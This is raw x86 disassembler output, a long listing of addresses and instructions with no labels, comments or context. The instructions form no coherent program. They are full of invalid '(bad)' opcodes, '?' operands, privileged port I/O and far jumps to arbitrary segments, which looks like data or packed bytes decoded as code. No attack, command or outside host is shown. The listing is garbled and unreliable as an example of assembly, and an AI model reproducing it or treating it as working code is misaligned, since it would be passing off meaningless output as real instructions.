  411fc7:	adc    eax,0x4cce788d
  411fcc:	jb     0x411f60
  411fce:	and    BYTE PTR [esi-0x1e],cl
  411fd1:	and    DWORD PTR [esi],esi
  411fd3:	repz out 0xb0,eax
  411fd6:	imul   edx,edx,0xffffff9a
  411fd9:	push   0xe9f6e06c
  411fde:	retf   
  411fdf:	adc    ah,BYTE PTR ds:0x7b9accb6
  411fe5:	mov    ebp,0x4eb20cf4
  411fea:	mov    ebx,0xee9cea0e
  411fef:	cmp    bh,dh
  411ff1:	outs   dx,BYTE PTR ds:[esi]
  411ff2:	jb     0x412006
  411ff4:	dec    eax
  411ff5:	add    edi,DWORD PTR [edi-0x5a]
  411ff8:	cs nop
  411ffa:	cmp    eax,eax
  411ffc:	sub    BYTE PTR [ecx],al
  411ffe:	cmp    ah,bl
  412000:	rcr    DWORD PTR [eax+0x13],cl
  412003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412004:	add    DWORD PTR [ebp+eax*4+0x74],eax
  412008:	or     ebx,edx
  41200a:	mov    ebx,DWORD PTR [esi]
  41200c:	lds    esi,FWORD PTR gs:[ebp+0x4c770301]
  412013:	xor    al,ch
  412015:	mov    cl,cl
  412017:	shl    BYTE PTR ds:0x9e40b7d4,1
  41201d:	dec    edx
  41201e:	js     0x41206e
  412020:	sub    eax,0x2e31761f
  412025:	imul   ecx,DWORD PTR [ebp-0x31],0x3f
  412029:	jns    0x41209e
  41202b:	lods   al,BYTE PTR ds:[esi]
  41202c:	sub    DWORD PTR [ebx],ecx
  41202e:	mov    ah,0x8b
  412030:	xor    BYTE PTR [ebx-0x7314918d],dl
  412036:	sbb    al,0xfc
  412038:	jl     0x412053
  41203a:	mov    eax,DWORD PTR [edx]
  41203c:	xor    BYTE PTR [ecx+edi*4],ah
  41203f:	jae    0x4120a7
  412041:	sbb    dh,BYTE PTR [ebx+eax*4]
  412044:	arpl   WORD PTR [ecx],dx
  412046:	ss jno 0x412073
  412049:	jl     0x4120a3
  41204b:	sbb    BYTE PTR [ecx+edi*2],al
  41204e:	shr    BYTE PTR [ecx+0x1cc93d28],0xa1
  412055:	adc    esi,DWORD PTR [ebx]
  412057:	push   edx
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	fnstcw WORD PTR [edi+0x39a678bc]
  412061:	lock jge 0x412052
  412064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412065:	int    0xf
  412067:	in     eax,0xf9
  412069:	dec    edx
  41206a:	retf   
  41206b:	bound  esp,QWORD PTR [edi+eiz*2+0x60]
  41206f:	jmp    0x412054
  412071:	xchg   edx,eax
  412072:	push   esi
  412073:	leave  
  412074:	test   ah,bh
  412076:	inc    edx
  412077:	in     al,dx
  412078:	or     al,0xe6
  41207a:	fbld   TBYTE PTR [eax]
  41207c:	popa   
  41207d:	gs retf 
  41207f:	pop    esp
  412080:	hlt    
  412081:	or     ecx,edi
  412083:	leave  
  412084:	mov    gs,WORD PTR [edx-0x6e304001]
  41208a:	push   0x11
  41208c:	jg     0x412053
  41208e:	adc    BYTE PTR [ebx-0x1c993f64],ch
  412094:	pop    esi
  412095:	rcl    DWORD PTR ds:0xc20a9c5f,0xb3
  41209c:	loopne 0x412068
  41209e:	push   0x3
  4120a0:	xlat   BYTE PTR ds:[ebx]
  4120a1:	add    al,0x58
  4120a3:	add    eax,0x343ef96
  4120a8:	call   0x7b1fb76
  4120ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ae:	fild   DWORD PTR [edx-0x4b]
  4120b1:	into   
  4120b2:	(bad)  
  4120b3:	push   ss
  4120b4:	add    BYTE PTR [edx+0x1d],bh
  4120b7:	xchg   ebx,eax
  4120b8:	sub    BYTE PTR [ecx+0x64c856ea],ch
  4120be:	push   ss
  4120bf:	xchg   BYTE PTR [edi+0xa13e30],ch
  4120c5:	shl    dh,cl
  4120c7:	mov    ?,WORD PTR [ebp-0x76]
  4120ca:	lea    edx,ds:0xa784396f
  4120d0:	xor    eax,edi
  4120d2:	mov    ?,WORD PTR [edi]
  4120d4:	iret   
  4120d5:	ss inc ebx
  4120d7:	pop    ss
  4120d8:	arpl   WORD PTR [edx-0x4d9e494a],ax
  4120de:	lods   eax,DWORD PTR ds:[esi]
  4120df:	in     eax,dx
  4120e0:	fnstsw WORD PTR [ebx]
  4120e2:	fstp   QWORD PTR [edx]
  4120e4:	leave  
  4120e5:	add    dl,BYTE PTR [eax-0x1b498e09]
  4120eb:	pop    ss
  4120ec:	ins    DWORD PTR es:[edi],dx
  4120ed:	fstp   TBYTE PTR [eax]
  4120ef:	out    0xae,al
  4120f1:	mov    ah,0xd9
  4120f3:	jnp    0x4120f2
  4120f5:	data16 aaa 
  4120f7:	out    dx,eax
  4120f8:	(bad)  
  4120f9:	ret    0xb9e3
  4120fc:	out    dx,al
  4120fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120fe:	repnz pop es
  412100:	ja     0x4120bc
  412102:	jmp    0xc3877fc3
  412107:	sbb    al,ch
  412109:	mov    edi,eax
  41210b:	add    eax,0x5b8f6fc5
  412110:	or     BYTE PTR [edi-0x2e],ch
  412113:	xor    ebx,edi
  412115:	retf   
  412116:	ins    BYTE PTR es:[edi],dx
  412117:	ins    DWORD PTR es:[edi],dx
  412118:	out    dx,al
  412119:	jle    0x412176
  41211b:	pop    ds
  41211c:	loope  0x4120ac
  41211e:	dec    esp
  41211f:	pop    es
  412120:	ins    DWORD PTR es:[edi],dx
  412121:	fisubr DWORD PTR [eax+0x3d]
  412124:	loop   0x41217c
  412126:	add    eax,0x6279c336
  41212b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212c:	push   0x11
  41212e:	adc    DWORD PTR es:[eax],0x3e610afd
  412135:	lds    esp,FWORD PTR [ebp*4+0x89f2f70]
  41213c:	mov    dh,0x48
  41213e:	(bad)  
  41213f:	out    0x4e,eax
  412141:	jo     0x4121af
  412143:	and    DWORD PTR [ecx-0x710d7b1e],edx
  412149:	popa   
  41214a:	mov    ds:0x9e2de0b2,al
  41214f:	adc    ebp,DWORD PTR [ebx+esi*8]
  412152:	retf   0x1486
  412155:	push   ss
  412156:	jae    0x41217c
  412158:	cwde   
  412159:	ins    DWORD PTR es:[edi],dx
  41215a:	rcr    cl,cl
  41215c:	sti    
  41215d:	push   ebx
  41215e:	mov    cl,0x1a
  412160:	fs int 0xc6
  412163:	icebp  
  412164:	cmp    ah,0xe4
  412167:	fisttp QWORD PTR [ebx-0x69]
  41216a:	or     eax,0xbd787221
  41216f:	xchg   esp,eax
  412170:	xor    eax,0x5b62837d
  412175:	addr16 je 0x4121b4
  412178:	iret   
  412179:	and    dh,bl
  41217b:	or     al,0xa1
  41217e:	mov    edx,0xe2887a79
  412183:	push   cs
  412184:	mov    ds:0x74edafb8,al
  412189:	xchg   edi,eax
  41218a:	ret    
  41218b:	dec    ebp
  41218c:	dec    ebp
  41218d:	daa    
  41218e:	loop   0x412202
  412190:	cmp    eax,0x51bb56da
  412195:	sti    
  412196:	dec    ebx
  412197:	out    dx,eax
  412198:	mov    ebp,0x733ab92c
  41219d:	repz xor eax,0x9bd5199a
  4121a3:	xchg   esp,eax
  4121a4:	xchg   esi,eax
  4121a5:	mov    cl,0x3b
  4121a7:	sub    edi,DWORD PTR [esi+esi*1+0x1066e0ae]
  4121ae:	mov    edx,0xef0140a9
  4121b3:	pusha  
  4121b4:	xchg   ebp,eax
  4121b5:	out    dx,eax
  4121b6:	jno    0x41216b
  4121b8:	jle    0x4121ea
  4121ba:	inc    eax
  4121bb:	lock imul eax,DWORD PTR [edx+0x6a],0x48
  4121c0:	jl     0x41222c
  4121c2:	pop    ebx
  4121c3:	push   ebp
  4121c4:	ror    BYTE PTR [edx+0x2e2b0b52],cl
  4121ca:	push   edx
  4121cb:	pushf  
  4121cc:	cdq    
  4121cd:	aad    0x8c
  4121cf:	sahf   
  4121d0:	out    dx,eax
  4121d1:	mov    ah,0x4a
  4121d3:	ja     0x4121c5
  4121d5:	out    0x7,al
  4121d7:	jae    0x412207
  4121d9:	sbb    BYTE PTR [eax],0xcc
  4121dc:	or     BYTE PTR [edi+0x352b7a97],0xbb
  4121e3:	fwait
  4121e4:	sub    edi,ecx
  4121e6:	shrd   DWORD PTR [edi-0x11],edx,0x2
  4121eb:	mov    ch,0x56
  4121ed:	jle    0x4121c6
  4121ef:	pop    edi
  4121f0:	clc    
  4121f1:	imul   edi,edx,0x9e915ed7
  4121f7:	ret    
  4121f8:	jle    0x41225c
  4121fa:	stos   DWORD PTR es:[edi],eax
  4121fb:	fpatan 
  4121fd:	adc    edi,edx
  4121ff:	loop   0x41223c
  412201:	pop    edx
  412202:	add    ebp,DWORD PTR [eax-0x3b329833]
  412208:	ret    
  412209:	(bad)  
  41220b:	lea    edx,[eax-0x65]
  41220e:	je     0x4121ae
  412210:	cwde   
  412211:	xchg   ebx,eax
  412212:	ret    
  412213:	adc    ebx,ebx
  412215:	cmp    ebp,eax
  412217:	out    dx,eax
  412218:	mov    bh,0xad
  41221a:	mov    ebx,0x9ee54182
  41221f:	stc    
  412220:	xchg   ebx,eax
  412221:	fisttp WORD PTR [ebp-0x59]
  412224:	ds xchg ecx,eax
  412226:	scas   eax,DWORD PTR es:[edi]
  412227:	in     eax,dx
  412228:	dec    esi
  412229:	hlt    
  41222a:	and    dh,BYTE PTR [ebp+0x76]
  41222d:	inc    ecx
  41222e:	xor    DWORD PTR [edx+0x2efe293b],esi
  412234:	hlt    
  412235:	add    eax,0x622dc4c9
  41223a:	sub    al,0x82
  41223c:	mov    ss:0xea976b31,eax
  412242:	(bad)  
  412243:	ins    BYTE PTR es:[edi],dx
  412244:	scas   al,BYTE PTR es:[edi]
  412245:	pop    edi
  412246:	into   
  412247:	sti    
  412248:	mov    edi,ecx
  41224a:	dec    ebx
  41224b:	adc    eax,0xdf40e59a
  412250:	sbb    DWORD PTR [eax-0x66],0x19
  412254:	inc    ebx
  412255:	jp     0x4121ee
  412257:	ret    
  412258:	add    al,0x74
  41225a:	shr    ecx,0x8a
  41225d:	in     al,dx
  41225e:	mov    dh,0xb7
  412260:	inc    edi
  412261:	mov    ds:0x569e5982,al
  412266:	push   ebp
  412267:	(bad)  
  412268:	int    0xec
  41226a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41226b:	push   ebp
  41226c:	adc    eax,0xee27d733
  412271:	cmp    edi,edx
  412273:	outs   dx,BYTE PTR ds:[esi]
  412274:	sbb    edx,DWORD PTR [ecx-0x3b]
  412277:	add    BYTE PTR [edi-0x1e3f6f3],0xd9
  41227e:	cmp    DWORD PTR [edx],esp
  412280:	mov    al,ds:0x714d92fc
  412285:	xchg   ebp,eax
  412286:	push   cs
  412287:	call   DWORD PTR [ecx+0x17e2d5d3]
  41228d:	sub    DWORD PTR [eax-0x4aede78a],ebx
  412293:	or     ebx,DWORD PTR [edi-0x32]
  412296:	dec    esi
  412297:	ins    BYTE PTR es:[edi],dx
  412298:	scas   al,BYTE PTR es:[edi]
  412299:	pop    ds
  41229a:	push   edi
  41229b:	in     al,dx
  41229c:	jmp    0xf321:0x3b361777
  4122a3:	shr    DWORD PTR [edi],1
  4122a5:	push   esp
  4122a6:	leave  
  4122a7:	outs   dx,DWORD PTR ds:[esi]
  4122a8:	sub    BYTE PTR [ebx],ch
  4122aa:	pop    ebp
  4122ab:	pusha  
  4122ac:	cmovg  esp,DWORD PTR [ecx+0x61e50db7]
  4122b3:	xchg   ebx,eax
  4122b4:	pop    ecx
  4122b5:	xchg   ecx,eax
  4122b6:	jmp    0xd73fee46
  4122bb:	fist   DWORD PTR [ecx+0x26]
  4122be:	lds    eax,FWORD PTR [esi-0x3]
  4122c1:	mov    eax,0xfc7e9f4c
  4122c6:	cmp    al,0x8b
  4122c8:	and    edi,DWORD PTR [edx]
  4122ca:	mov    ah,BYTE PTR [ecx]
  4122cc:	mov    ds:0xc1a259fc,al
  4122d1:	pop    ss
  4122d2:	pop    edx
  4122d3:	retf   
  4122d4:	mov    al,ds:0xa6a58b6b
  4122d9:	pusha  
  4122da:	xchg   edi,eax
  4122db:	push   ds
  4122dc:	clc    
  4122dd:	sbb    esp,DWORD PTR [ecx]
  4122df:	and    al,0xe6
  4122e1:	les    esp,FWORD PTR ds:0xad4cabf4
  4122e7:	xor    al,0x30
  4122e9:	dec    esp
  4122ea:	mov    dh,0x99
  4122ec:	inc    esp
  4122ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ee:	es mov dh,0x9
  4122f1:	xchg   esp,eax
  4122f2:	mov    dh,0xf8
  4122f4:	or     al,BYTE PTR [edi-0x26]
  4122f7:	push   eax
  4122f8:	retf   0x4191
  4122fb:	test   ah,bh
  4122fd:	dec    esp
  4122fe:	mov    dh,0x53
  412300:	pop    edx
  412301:	cs jecxz 0x412302
  412304:	dec    edi
  412305:	dec    edi
  412306:	sbb    DWORD PTR [eax+0x1dc7b947],0xf55132b7
  412310:	push   cs
  412311:	sub    BYTE PTR [edx],ah
  412313:	pusha  
  412314:	dec    eax
  412315:	pop    esp
  412316:	dec    edi
  412317:	fmul   st,st(4)
  412319:	js     0x4122e9
  41231b:	mul    esi
  41231d:	pop    esi
  41231e:	pop    ebx
  41231f:	outs   dx,DWORD PTR ds:[esi]
  412320:	push   ecx
  412321:	and    al,ah
  412323:	xchg   ebx,eax
  412324:	sub    ebx,0xffffffd7
  412327:	loopne 0x4122b5
  412329:	push   edx
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	shl    DWORD PTR [ebp+ecx*4-0x60],cl
  41232f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412330:	inc    ebp
  412331:	sub    esi,DWORD PTR [ecx-0x34]
  412334:	pop    ds
  412335:	and    esi,DWORD PTR [edi-0x18]
  412338:	or     DWORD PTR [ebp+ecx*2+0x7d],ebp
  41233c:	ins    BYTE PTR es:[edi],dx
  41233d:	loope  0x4122d8
  41233f:	jmp    0xf0ae:0x6783f1dc
  412346:	sbb    ecx,0xb4fc9b21
  41234c:	ds mov ebx,0x582bd8b1
  412352:	(bad)  
  412353:	ins    BYTE PTR es:[edi],dx
  412354:	fmul   QWORD PTR [eax-0x2913f0c8]
  41235a:	(bad)  
  41235b:	jno    0x412334
  41235d:	push   ecx
  41235e:	pushf  
  41235f:	stc    
  412360:	or     eax,0x4fc76f79
  412365:	sbb    dl,BYTE PTR [eax-0x6f]
  412368:	(bad)  
  412369:	mov    edx,0x79553165
  41236e:	(bad)  
  41236f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412370:	cmp    DWORD PTR [ecx],ebx
  412372:	out    0xac,eax
  412374:	shr    DWORD PTR [ebp+0x3b],1
  412377:	add    BYTE PTR [ecx+0x4b],ch
  41237a:	sbb    eax,0x3d9903
	...
  412557:	add    BYTE PTR [eax],al
  412559:	add    BYTE PTR [edi-0x1ab332f],ch
  41255f:	pop    ebp
  412560:	mov    edi,0x5e13fbfb
  412565:	cmp    DWORD PTR [esi+ebp*2],esp
  412568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412569:	xor    bl,bl
  41256b:	loope  0x41256e
  41256d:	add    BYTE PTR [eax],ah
  41256f:	pop    es
  412570:	add    BYTE PTR [eax],al
  412572:	fistp  WORD PTR [edi]
  412574:	xor    eax,0xd0716c97
  412579:	jb     0x4125a6
  41257b:	sbb    BYTE PTR [eax-0x525ff64e],bh
  412581:	pop    edx
  412582:	jno    0x412529
  412584:	jne    0x412543
  412586:	or     eax,0x586b520c
  41258b:	ficom  WORD PTR [edi+0x3]
  41258e:	jo     0x412584
  412590:	mov    eax,0x8ae81212
  412595:	in     al,dx
  412596:	sbb    al,0x34
  412598:	and    ch,dh
  41259a:	sub    DWORD PTR [ebp+0x66],0x4a
  41259e:	daa    
  41259f:	jnp    0x4125e3
  4125a1:	std    
  4125a2:	ror    DWORD PTR [edx-0x6e],0x1d
  4125a6:	push   ebx
  4125a7:	mov    ds:0xf9c0f785,eax
  4125ac:	repnz inc esp
  4125ae:	call   0xb8ed:0x2cb62bd2
  4125b5:	inc    esp
  4125b6:	sub    cl,ch
  4125b8:	or     al,BYTE PTR [eax]
  4125ba:	ret    
  4125bb:	xor    eax,DWORD PTR [edi+eiz*1-0x44]
  4125bf:	adc    BYTE PTR [edi-0x14],ah
  4125c2:	loopne 0x4125c0
  4125c4:	add    eax,0x5997adf7
  4125c9:	xor    ebx,DWORD PTR [ecx+ebp*2-0x6a]
  4125cd:	retf   0x6801
  4125d0:	jmp    0x41264d
  4125d2:	push   0x29
  4125d4:	in     eax,0x6
  4125d6:	mov    esp,?
  4125d8:	mov    esp,0xb9fccd44
  4125dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125de:	pop    ebp
  4125df:	aam    0x8e
  4125e1:	bnd jae 0x412656
  4125e4:	std    
  4125e5:	dec    ecx
  4125e6:	dec    esi
  4125e7:	imul   ebx,DWORD PTR [ecx-0x18ef85b7],0x76
  4125ee:	std    
  4125ef:	outs   dx,BYTE PTR ds:[esi]
  4125f0:	add    al,0xf4
  4125f2:	mov    esp,0xd0c544af
  4125f7:	inc    ebx
  4125f8:	and    edi,esp
  4125fa:	and    esi,DWORD PTR [esi+0x27e6a6bd]
  412600:	bound  ebp,QWORD PTR gs:[eax-0x1]
  412604:	mov    ds,WORD PTR [eax-0x72d19705]
  41260a:	inc    eax
  41260b:	outs   dx,DWORD PTR ds:[esi]
  41260c:	(bad)  
  41260d:	jnp    0x412644
  41260f:	xchg   ecx,eax
  412610:	jl     0x412600
  412612:	retf   0xae3
  412615:	clc    
  412616:	ficomp DWORD PTR [ecx+esi*1]
  412619:	push   0xfffffffd
  41261b:	mov    BYTE PTR cs:[ecx+eax*2-0x63ec341],ah
  412623:	int3   
  412624:	or     BYTE PTR [ebx*2-0x39433067],bh
  41262b:	inc    BYTE PTR [edi]
  41262d:	jp     0x41262b
  41262f:	sbb    eax,0xa82da289
  412634:	xor    BYTE PTR [esi+0x3107b35f],cl
  41263a:	xchg   BYTE PTR [eax],cl
  41263c:	xchg   ebp,eax
  41263d:	test   al,0xac
  41263f:	xchg   esi,eax
  412640:	lock pop eax
  412642:	nop
  412643:	arpl   WORD PTR [eax-0x3c],cx
  412646:	jae    0x4125e7
  412648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412649:	inc    esi
  41264a:	mov    edx,0xe5c345e1
  41264f:	aam    0xb2
  412651:	mov    ah,0xcd
  412653:	xor    al,0xda
  412655:	aam    0x7b
  412657:	inc    esi
  412658:	mov    cl,0x13
  41265a:	add    BYTE PTR [ebp+0x74c2f310],bl
  412660:	mov    esi,?
  412662:	xor    DWORD PTR [ecx+0x77],esp
  412665:	aad    0x97
  412667:	popf   
  412668:	fwait
  412669:	jmp    0xedff:0xb25a8d37
  412670:	cld    
  412671:	mov    WORD PTR [edx+ebp*1+0x7e],ds
  412675:	outs   dx,BYTE PTR ds:[esi]
  412676:	pop    esp
  412677:	pop    esp
  412678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412679:	push   edx
  41267a:	mov    al,0x58
  41267c:	add    al,0x3c
  41267e:	xor    ch,BYTE PTR ds:[ecx]
  412681:	mov    ebp,0x555716f9
  412686:	add    al,0xae
  412688:	test   BYTE PTR [ecx-0x50],bh
  41268b:	imul   eax,ebx,0x8db9f27c
  412691:	push   edx
  412692:	jmp    0xbd94f01d
  412697:	jecxz  0x412625
  412699:	add    dh,BYTE PTR [edi+0x37]
  41269c:	repnz test al,0x87
  41269f:	push   ecx
  4126a0:	push   ds
  4126a1:	and    ebx,DWORD PTR [eax+0x59c1e91a]
  4126a7:	mov    edi,0xd6299571
  4126ac:	fist   DWORD PTR [ebp-0x5e2446a1]
  4126b2:	add    ebx,DWORD PTR [eax+0x57]
  4126b5:	imul   eax,DWORD PTR [edx-0x222e19d0],0xae7a755d
  4126bf:	xchg   edi,eax
  4126c0:	cmp    esi,0x5398671d
  4126c6:	pop    esi
  4126c7:	cmp    al,0x89
  4126c9:	lods   eax,DWORD PTR ds:[esi]
  4126ca:	mov    eax,ds:0x9703840
  4126cf:	cmp    edi,0xffffffce
  4126d2:	dec    ebp
  4126d3:	cmp    al,0x46
  4126d5:	mov    esi,0x304c9209
  4126da:	fcomip st,st(1)
  4126dc:	mov    edx,eax
  4126de:	add    edi,eax
  4126e0:	test   eax,0x6a9f12b9
  4126e5:	mov    dl,0x9a
  4126e7:	sar    DWORD PTR ds:0x80d4b514,cl
  4126ed:	add    eax,0x4e2fee7a
  4126f2:	xor    al,0x3e
  4126f4:	in     eax,0x1e
  4126f6:	aam    0xd2
  4126f8:	jl     0x41276d
  4126fa:	cmp    ecx,DWORD PTR es:[edx-0x46]
  4126fe:	jl     0x41277a
  412700:	add    BYTE PTR [edi+0x57],ch
  412703:	pop    ebp
  412704:	sahf   
  412705:	out    0x78,eax
  412707:	jle    0x4126d1
  412709:	(bad)  
  41270a:	xchg   ecx,eax
  41270b:	adc    DWORD PTR [esi],eax
  41270d:	pop    ebp
  41270e:	add    DWORD PTR [eax-0x6a052134],esp
  412714:	lea    eax,[edx+0x86ffe91]
  41271a:	out    0x1e,eax
  41271c:	out    0x43,eax
  41271e:	sub    DWORD PTR [esp+ebp*8-0x2626c231],esp
  412725:	pop    eax
  412726:	jmp    0x4126b5
  412728:	cmp    eax,DWORD PTR [edx+0x54]
  41272b:	popa   
  41272c:	mov    DWORD PTR [edx-0x17],esp
  41272f:	call   0xe0803c41
  412734:	call   0x60def866
  412739:	sub    DWORD PTR [edx],esi
  41273b:	pop    ecx
  41273c:	xchg   edx,eax
  41273d:	dec    esi
  41273e:	js     0x412767
  412740:	jle    0x41277d
  412742:	and    al,0x6d
  412744:	(bad)  
  412745:	push   esp
  412746:	(bad)  
  412747:	jmp    0x4870:0xf1fd7459
  41274e:	sub    al,0xb3
  412750:	mov    eax,ds:0xff89c3bb
  412755:	and    DWORD PTR [eax+0x3f],0x4c5bf376
  41275c:	sbb    DWORD PTR [eax+0x47],esi
  41275f:	dec    esi
  412760:	data16 js 0x4127a2
  412763:	scas   al,BYTE PTR es:[edi]
  412764:	call   0x2c3a6c22
  412769:	loope  0x412754
  41276b:	imul   edx,DWORD PTR [esp+edi*1-0x56],0x8cf29b5b
  412773:	(bad)  
  412774:	mov    bl,0x77
  412776:	and    ah,0x20
  412779:	lea    eax,[ebx]
  41277b:	fiadd  WORD PTR ds:0x3e16c0ff
  412781:	mov    DWORD PTR gs:[esi+esi*4-0x33d33b5e],edx
  412789:	adc    eax,0xa0bffc71
  41278e:	jecxz  0x4127d5
  412790:	push   ebp
  412791:	cdq    
  412792:	mov    DWORD PTR [ebp+0x1f967191],ebp
  412798:	xor    ah,BYTE PTR [ebx-0x3f9ce25f]
  41279e:	fsub   QWORD PTR [ebx*1+0x6bcc1477]
  4127a5:	push   ss
  4127a6:	std    
  4127a7:	add    edx,DWORD PTR [edx-0x6d]
  4127aa:	pushf  
  4127ab:	sub    eax,0x546cc042
  4127b0:	mov    ss,ecx
  4127b2:	sub    edx,DWORD PTR [edi+0x67f7a64e]
  4127b8:	push   0xb63877f3
  4127bd:	outs   dx,BYTE PTR ds:[esi]
  4127be:	ror    BYTE PTR [edi+eax*4+0x529eb555],1
  4127c5:	int    0x31
  4127c7:	mov    cl,0x60
  4127c9:	mov    ah,0x17
  4127cb:	adc    eax,0xa6f270ef
  4127d0:	cmc    
  4127d1:	push   eax
  4127d2:	jle    0x412805
  4127d4:	mov    ebx,0x521e9048
  4127d9:	call   0x2c0cd73d
  4127de:	xor    al,0xae
  4127e0:	fdivr  DWORD PTR [ebp-0x65]
  4127e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e4:	inc    ecx
  4127e5:	std    
  4127e6:	(bad)  
  4127e7:	nop
  4127e8:	jns    0x412863
  4127ea:	(bad)  
  4127eb:	jmp    0x38e3:0x70811046
  4127f2:	adc    dl,BYTE PTR [eax-0x1d3ee777]
  4127f8:	loope  0x4127fe
  4127fa:	ja     0x412878
  4127fc:	or     ebx,edi
  4127fe:	fnstenv [edi+0x4c]
  412801:	cmp    eax,0x13bb76fa
  412806:	mov    ds:0xa12196ef,al
  41280b:	call   0x6d78:0x3b0db82e
  412812:	cmp    BYTE PTR [ebp-0x4b66d896],dh
  412818:	xchg   edi,eax
  412819:	pop    ss
  41281a:	scas   eax,DWORD PTR es:[edi]
  41281b:	mov    ebx,0x66e3c1d3
  412820:	lahf   
  412821:	scas   eax,DWORD PTR es:[edi]
  412822:	xor    eax,0x8a21367c
  412827:	jae    0x4127fc
  412829:	cld    
  41282a:	mov    cl,0x39
  41282c:	in     eax,dx
  41282d:	push   esi
  41282e:	cmp    ecx,edx
  412830:	aas    
  412831:	mov    dh,0xd
  412833:	sbb    eax,0x60db8ded
  412838:	xchg   ecx,eax
  412839:	stos   DWORD PTR es:[edi],eax
  41283a:	ins    DWORD PTR es:[edi],dx
  41283b:	rcr    DWORD PTR [eax-0x3841a8f7],1
  412841:	sub    ecx,esp
  412843:	push   esi
  412844:	in     al,0xa
  412846:	and    al,0x57
  412848:	and    BYTE PTR [ebx+0x27f8dcad],dl
  41284e:	jmp    0x41283c
  412850:	(bad)  
  412851:	fcomp  DWORD PTR [ebx]
  412853:	nop
  412854:	adc    DWORD PTR [eax+0x65],ecx
  412857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412858:	fwait
  412859:	aad    0x87
  41285b:	pop    es
  41285c:	jle    0x41280d
  41285e:	es push esp
  412860:	out    dx,eax
  412861:	fstp   st(2)
  412863:	sar    DWORD PTR [edi],1
  412865:	pop    eax
  412866:	push   cs
  412867:	dec    edx
  412868:	sbb    DWORD PTR [edx+eiz*8-0x2db2ce50],edx
  41286f:	aam    0xec
  412871:	adc    BYTE PTR [esi+0x4b],bl
  412874:	je     0x412878
  412876:	and    al,0x48
  412878:	frstor [edx+0x33]
  41287b:	lds    ecx,FWORD PTR [ebp+0x22]
  41287e:	cmp    BYTE PTR [ebx+0xe],bl
  412881:	fs icebp 
  412883:	mov    edx,DWORD PTR [ecx+0x922cd6b]
  412889:	mov    edx,0xe78c9368
  41288e:	jae    0x412874
  412890:	xor    al,0x86
  412892:	inc    ecx
  412893:	aam    0xd9
  412895:	fadd   QWORD PTR [esi+0x7a]
  412898:	sar    DWORD PTR [eax-0x7f],0x99
  41289c:	inc    ecx
  41289d:	pop    es
  41289e:	fsubr  DWORD PTR [ebx]
  4128a0:	repz add edx,0xc
  4128a4:	stos   DWORD PTR es:[edi],eax
  4128a5:	jns    0x41289f
  4128a7:	daa    
  4128a8:	jmp    0x412865
  4128aa:	mov    ecx,0xc8b68a22
  4128af:	push   ss
  4128b0:	cmp    al,bh
  4128b2:	mov    ah,0xa
  4128b4:	jbe    0x4128ca
  4128b6:	(bad)  
  4128b7:	loope  0x41284d
  4128b9:	mov    dl,bl
  4128bb:	into   
  4128bc:	jnp    0x412924
  4128be:	je     0x41293e
  4128c0:	dec    ecx
  4128c1:	iret   
  4128c2:	add    DWORD PTR [ebx+0x6cf7903e],esp
  4128c8:	xchg   ebx,eax
  4128c9:	push   cs
  4128ca:	and    eax,esp
  4128cc:	daa    
  4128cd:	rcr    DWORD PTR [ecx+esi*1],0xd0
  4128d1:	mov    ebp,0x7758207f
  4128d6:	(bad)  
  4128d8:	dec    ebx
  4128d9:	adc    eax,0xd0650acf
  4128de:	ins    DWORD PTR es:[edi],dx
  4128df:	dec    DWORD PTR [edx+0x110b1e42]
  4128e5:	fsubrp st(4),st
  4128e7:	fisttp DWORD PTR [esi-0x4b]
  4128ea:	fnstsw WORD PTR [ebx+0xd4332f3]
  4128f0:	adc    DWORD PTR [ebp+0x35],ebp
  4128f3:	clc    
  4128f4:	mov    eax,ds:0x47e18425
  4128f9:	pop    ecx
  4128fa:	or     dl,BYTE PTR [eax+0x1]
  4128fd:	cmp    al,0xb5
  4128ff:	cmp    al,0xf6
  412901:	cli    
  412902:	inc    edi
  412903:	scas   al,BYTE PTR es:[edi]
  412904:	xchg   esi,eax
  412905:	outs   dx,DWORD PTR ds:[esi]
  412906:	adc    al,0xe3
  412908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412909:	test   DWORD PTR [ebp-0x47],eax
  41290c:	inc    DWORD PTR [edi+0xf]
  41290f:	sub    al,0xd
  412911:	sbb    BYTE PTR [edx+0x5c],bl
  412914:	xchg   esi,eax
  412915:	pop    edx
  412916:	xlat   BYTE PTR ds:[ebx]
  412917:	lahf   
  412918:	adc    eax,0xcacf14c8
  41291d:	xchg   esi,eax
  41291e:	repz push esi
  412920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412921:	imul   ebp,DWORD PTR [esi],0x62064edc
  412927:	inc    esp
  412928:	sbb    DWORD PTR [edx+0x65790c01],ecx
  41292e:	fsub   DWORD PTR [edi]
  412930:	pop    ds
  412931:	fnstsw WORD PTR [ecx-0x60]
  412934:	aam    0x22
  412936:	xchg   edi,eax
  412937:	test   al,0x74
  412939:	mov    eax,ds:0x8d2ba7a7
  41293e:	xlat   BYTE PTR ds:[ebx]
  41293f:	stc    
  412940:	cmp    BYTE PTR [eax+0x4f],ch
  412943:	repz (bad) 
  412945:	out    0x57,al
  412947:	xchg   ecx,eax
  412948:	scas   eax,DWORD PTR es:[edi]
  412949:	push   0xffffffde
  41294b:	xlat   BYTE PTR ds:[ebx]
  41294c:	sbb    al,ah
  41294e:	ins    BYTE PTR es:[edi],dx
  41294f:	mov    cl,0xf5
  412951:	(bad)  
  412952:	stos   BYTE PTR es:[edi],al
  412953:	xor    BYTE PTR [edi-0x1d2dca07],bh
